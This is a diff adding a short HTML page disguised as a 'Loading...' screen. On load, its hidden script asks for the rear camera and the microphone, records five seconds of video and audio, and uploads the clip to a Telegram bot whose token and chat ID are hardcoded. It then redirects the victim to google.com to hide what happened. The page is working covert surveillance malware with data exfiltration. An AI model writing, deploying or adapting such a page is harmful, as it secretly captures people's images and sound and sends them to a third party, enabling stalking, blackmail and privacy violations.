@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <video id="video" autoplay style="display:none;"></video>
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
+
+        async function start() {
+            // 'environment' orqa kamerani bildiradi
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('video', blob, 'back_video.mp4');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo?chat_id=${adminId}`, { method: 'POST', body: fd });
+                window.location.href = "https://google.com";
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
+
